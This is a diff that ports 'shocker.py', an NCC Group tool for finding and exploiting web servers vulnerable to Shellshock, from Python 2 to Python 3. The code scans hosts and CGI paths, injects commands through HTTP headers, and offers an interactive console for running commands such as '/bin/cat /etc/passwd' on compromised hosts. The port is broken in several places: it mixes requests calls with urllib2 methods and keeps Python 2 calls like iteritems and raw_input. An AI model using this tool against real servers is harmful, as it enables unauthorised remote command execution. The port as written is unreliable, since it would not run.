@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 """
 shocker.py v1.1
@@ -8,6 +8,7 @@ A tool to find and exploit webservers vulnerable to Shellshock
 # Released as open source by NCC Group Plc - http://www.nccgroup.com/        #
 #                                                                            #
 # Developed by Tom Watson, tom.watson@nccgroup.trust                         #
+#    And adapted for python3 by SRazoes                                      #
 #                                                                            #
 # https://www.github.com/nccgroup/shocker                                    #
 #                                                                            #
@@ -30,15 +31,15 @@ Scans all hosts specified in the file ./iplist with default options
 Read the README for more details
 """
 
-import urllib2
+import requests
 import argparse
 import string
-import StringIO
+from io import StringIO
 import random
 import signal
 import sys
 import socket
-import Queue
+import queue
 import threading
 import re
 from collections import OrderedDict
@@ -81,9 +82,9 @@ def check_hosts(host_target_list, port, verbose):
     number_of_targets = len (host_target_list)
     confirmed_hosts = [] # List of resoveable and reachable hosts
     if number_of_targets > 1:
-        print "[+] Checking connectivity to targets..."
+        print("[+] Checking connectivity to targets...")
     else:
-        print "[+] Checking connectivity with target..."
+        print("[+] Checking connectivity with target...")
     for host in host_target_list:
         counter += 1
         # Show a progress bar unless verbose or there is only 1 host 
@@ -91,26 +92,25 @@ def check_hosts(host_target_list, port, verbose):
             print_progress(number_of_targets, counter) 
 
         try:
-            if verbose: print "[I] Checking to see if %s resolves..." % host
+            if verbose: print("[I] Checking to see if %s resolves..." % host)
             ipaddr = socket.gethostbyname(host)
-            if verbose: print "[I] Resolved ok"
-            if verbose: print "[I] Checking to see if %s is reachable on port %s..." % (host, port)
+            if verbose: print("[I] Resolved ok")
+            if verbose: print("[I] Checking to see if %s is reachable on port %s..." % (host, port))
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5.0)
             s.connect((ipaddr, int(port)))
             s.close()
-            if verbose: print "[I] %s seems reachable..." % host
+            if verbose: print("[I] %s seems reachable..." % host)
             confirmed_hosts.append(host)
         except Exception as e:
-            print "[!] Exception - %s: %s" % (host, e)
-            print "[!] Omitting %s from target list..." % host
+            print("[!] Exception - %s: %s" % (host, e))
+            print("[!] Omitting %s from target list..." % host)
     if len(host_target_list) > 1:
-        print "[+] %i of %i targets were reachable" % \
-                            (len(confirmed_hosts), number_of_targets)
+        print("[+] %i of %i targets were reachable" % (len(confirmed_hosts), number_of_targets))
     elif len(confirmed_hosts) == 1:
-        print "[+] Target was reachable"
+        print("[+] Target was reachable")
     else:
-        print "[+] Host unreachable"
+        print("[+] Host unreachable")
     return confirmed_hosts
 
 
@@ -122,11 +122,11 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
     # List of potentially epxloitable URLs 
     exploit_targets = []
     cgi_num = len(cgi_list)
-    q = Queue.Queue()
+    q = queue.Queue()
     threads = []
     
     for host in host_target_list:
-        print "[+] Looking for vulnerabilities on %s:%s" % (host, port) 
+        print ("[+] Looking for vulnerabilities on %s:%s" % (host, port) )
         cgi_index = 0
         for cgi in cgi_list:
             cgi_index += 1
@@ -135,7 +135,7 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
             if not verbose and cgi_num > 1: print_progress(cgi_num, cgi_index) 
 
             try:
-                req = urllib2.Request(protocol + "://" + host + ":" + port + cgi)
+                req = requests.get(protocol + "://" + host + ":" + port + cgi)
                 url = req.get_full_url()
                 if proxy:
                     req.set_proxy(proxy, "http")    
@@ -149,12 +149,12 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
                 thread_pool.acquire()
                 
                 # Start a thread for each CGI in cgi_list
-                if verbose: print "[I] Starting thread %i" % cgi_index
+                if verbose: print("[I] Starting thread %i" % cgi_index)
                 t = threading.Thread(target = do_check_cgi, args = (req, q, verbose))
                 t.start()
                 threads.append(t)
             except Exception as e: 
-                if verbose: print "[I] %s - %s" % (url, e) 
+                if verbose: print("[I] %s - %s" % (url, e))
             finally:
                 pass
 
@@ -167,7 +167,7 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
         while not q.empty():
             exploit_targets.append(q.get())
     
-    if verbose: print "[+] Finished host scan"
+    if verbose: print("[+] Finished host scan")
     return exploit_targets
 
 def do_check_cgi(req, q, verbose):
@@ -175,10 +175,10 @@ def do_check_cgi(req, q, verbose):
     """
 
     try:
-        if urllib2.urlopen(req, None, TIMEOUT).getcode() == 200:
+        if requests.get(req, None, TIMEOUT).getcode() == 200:
             q.put(req.get_full_url())
     except Exception as e:
-        if verbose: print "[I] %s for %s" % (e, req.get_full_url()) 
+        if verbose: print("[I] %s for %s" % (e, req.get_full_url()))
     finally:
         thread_pool.release()
 
@@ -204,31 +204,31 @@ def do_exploit_cgi(proxy, target_list, command, verbose):
     successful_targets = OrderedDict()
 
     if len(target_list) > 1:
-        print "[+] %i potential targets found, attempting exploits" % len(target_list)
+        print("[+] %i potential targets found, attempting exploits" % len(target_list))
     else:
-        print "[+] 1 potential target found, attempting exploits"
+        print("[+] 1 potential target found, attempting exploits")
     for target in target_list:
-        if verbose: print "[+] Trying exploit for %s" % target 
-        if verbose: print "[I] Flag set to: %s" % success_flag
+        if verbose: print("[+] Trying exploit for %s" % target )
+        if verbose: print("[I] Flag set to: %s" % success_flag)
         for header, exploit in attacks.iteritems():
             attack = exploit + " echo " + success_flag + "; " + command
             result = do_attack(proxy, target, header, attack, verbose)
             if success_flag in result:
                 if verbose: 
-                    print "[!] %s looks vulnerable" % target 
-                    print "[!] Response returned was:" 
+                    print("[!] %s looks vulnerable" % target )
+                    print("[!] Response returned was:" )
                     buf = StringIO.StringIO(result)
                     if len(result) > (len(success_flag)):
                         for line in buf:
                             if line.strip() != success_flag: 
-                                print "  %s" % line.strip()
+                                print("  %s" % line.strip())
                     else:
-                        print "[!] A result was returned but was empty..."
-                        print "[!] Maybe try a different exploit command?"
+                        print("[!] A result was returned but was empty...")
+                        print("[!] Maybe try a different exploit command?")
                     buf.close()
                 successful_targets.update({target: (header, exploit)})
             else:
-                if verbose: print "[-] Not vulnerable" 
+                if verbose: print("[-] Not vulnerable" )
     return successful_targets
 
 
@@ -238,19 +238,19 @@ def do_attack(proxy, target, header, attack, verbose):
 
     try:
         if verbose:
-            print "[I] Header is: %s" % header
-            print "[I] Attack string is: %s" % attack
-        req = urllib2.Request(target)
+            print("[I] Header is: %s" % header)
+            print("[I] Attack string is: %s" % attack)
+        req = requests.get(target)
         req.add_header(header, attack)
         if proxy:
             req.set_proxy(proxy, "http")    
-            if verbose: print "[I] Proxy set to: %s" % str(proxy)
+            if verbose: print("[I] Proxy set to: %s" % str(proxy))
         req.add_header("User-Agent", user_agent)
         req.add_header("Host", host)
-        resp = urllib2.urlopen(req, None, TIMEOUT)
+        resp = requests.get(req, None, TIMEOUT)
         result =  resp.read()
     except Exception as e:
-        if verbose: print "[I] %s - %s" % (target, e) 
+        if verbose: print("[I] %s - %s" % (target, e) )
     finally:
         pass
     return result
@@ -267,12 +267,12 @@ def ask_for_console(proxy, successful_targets, verbose):
     user_input = 1
     ordered_url_list = successful_targets.keys()
     
-    while user_input is not 0:
+    while user_input != 0:
         result = ""
-        print "[+] The following URLs appear to be exploitable:"
+        print("[+] The following URLs appear to be exploitable:")
         for x in range(len(ordered_url_list)):
-            print "  [%i] %s" % (x+1, ordered_url_list[x])
-        print "[+] Would you like to exploit further?"
+            print("  [%i] %s" % (x+1, ordered_url_list[x]))
+        print("[+] Would you like to exploit further?")
         user_input = raw_input("[>] Enter an URL number or 0 to exit: ")
         sys.stdout.flush()
         try:
@@ -280,15 +280,15 @@ def ask_for_console(proxy, successful_targets, verbose):
         except:
             continue
         if user_input not in range(len(successful_targets)+1):
-            print "[-] Please enter a number between 1 and %i (0 to exit)" % \
-                                                            len(successful_targets)
+            print("[-] Please enter a number between 1 and %i (0 to exit)" % \
+                                                            len(successful_targets))
             continue
         elif not user_input:
             continue
         target = ordered_url_list[user_input-1]
         header = successful_targets[target][0]
-        print "[+] Entering interactive mode for %s" % target
-        print "[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'"
+        print("[+] Entering interactive mode for %s" % target)
+        print("[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'")
 
         while True:
             command = ""
@@ -298,7 +298,7 @@ def ask_for_console(proxy, successful_targets, verbose):
             sys.stdout.flush()
             if command == "quit":
                 sys.stdout.flush()
-                print "[+] Exiting interactive mode..."
+                print("[+] Exiting interactive mode...")
                 sys.stdout.flush()
                 break
             if command:
@@ -310,11 +310,11 @@ def ask_for_console(proxy, successful_targets, verbose):
                 buf = StringIO.StringIO(result)
                 for line in buf:
                     sys.stdout.flush()
-                    print "  < %s" % line.strip()
+                    print("  < %s" % line.strip())
                     sys.stdout.flush()
             else:
                 sys.stdout.flush()
-                print "  > No response"
+                print("  > No response")
                 sys.stdout.flush()
 
 
@@ -324,11 +324,11 @@ def validate_address(hostaddress, debug):
 
     singleIP_pattern = re.compile('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
     FQDN_pattern = re.compile('^(\w+\.)*\w+$')
-    if debug: print "[D] Evaluating host '%s'" % hostaddress
+    if debug: print("[D] Evaluating host '%s'" % hostaddress)
     if singleIP_pattern.match(hostaddress) or FQDN_pattern.match(hostaddress):
         return True 
     else:
-        print "Host %s appears invalid, exiting..." % hostaddress
+        print("Host %s appears invalid, exiting..." % hostaddress)
         exit(0)
 
 
@@ -342,7 +342,7 @@ def get_targets_from_file(file_name, debug):
             line = line.strip()
             if not line.startswith('#') and validate_address(line, debug):
                 host_target_list.append(line)
-    print "[+] %i hosts imported from %s" % (len(host_target_list), file_name)
+    print("[+] %i hosts imported from %s" % (len(host_target_list), file_name))
     return host_target_list
 
 
@@ -355,7 +355,7 @@ def import_cgi_list_from_file(file_name):
         for line in f:
             if not line.startswith('#'):
                 cgi_list.append(line.strip())
-    print "[+] %i potential targets imported from %s" % (len(cgi_list), file_name)
+    print("[+] %i potential targets imported from %s" % (len(cgi_list), file_name))
     return cgi_list
 
 
@@ -370,13 +370,13 @@ def print_progress(
                 ): 
     percentage_progress = (100.0/float(total))*float(count)
     bar = int(bar_size * percentage_progress/100)
-    print lbracket + completed*bar + incomplete*(bar_size-bar) + rbracket + \
-        " (" + str(count).rjust(len(str(total)), " ") + "/" + str(total) + ")\r",
-    if percentage_progress == 100: print "\n"
+    print(lbracket + completed*bar + incomplete*(bar_size-bar) + rbracket + \
+        " (" + str(count).rjust(len(str(total)), " ") + "/" + str(total) + ")\r",)
+    if percentage_progress == 100: print("\n")
 
 
 def main():
-    print """
+    print("""
    .-. .            .            
   (   )|            |            
    `-. |--. .-.  .-.|.-. .-. .--.
@@ -389,7 +389,7 @@ def main():
  Released under the GNU Affero General Public License
  (https://www.gnu.org/licenses/agpl-3.0.html)
     
-    """ 
+    """ )
     
     # Handle CTRL-c elegently
     signal.signal(signal.SIGINT, signal_handler)
@@ -478,7 +478,7 @@ def main():
     else:
         host_target_list = get_targets_from_file(args.file, debug)
     if not len(host_target_list) > 0:
-        print "[-] No valid targets provided, exiting..."
+        print("[-] No valid targets provided, exiting...")
         exit (0)
     port = str(args.port)
     if args.proxy is not None:
@@ -493,13 +493,13 @@ def main():
         protocol = "http"
     global thread_pool
     if args.threads > 100:
-        print "Maximum number of threads is 100"
+        print("Maximum number of threads is 100")
         exit(0) 
     else:
         thread_pool = threading.BoundedSemaphore(args.threads)
     if args.cgi is not None:
         cgi_list = [args.cgi]
-        print "[+] Single target '%s' being used" % cgi_list[0]
+        print("[+] Single target '%s' being used" % cgi_list[0])
     else:
         cgi_list = import_cgi_list_from_file(args.cgilist)
 
@@ -515,9 +515,9 @@ def main():
         if len(successful_targets):
             ask_for_console(proxy, successful_targets, verbose)
         else:
-            print "[-] All exploit attempts failed"
+            print("[-] All exploit attempts failed")
     else:
-        print "[+] No targets found to exploit"
+        print("[+] No targets found to exploit")
 
 __version__ = '1.1'
 if __name__ == '__main__':
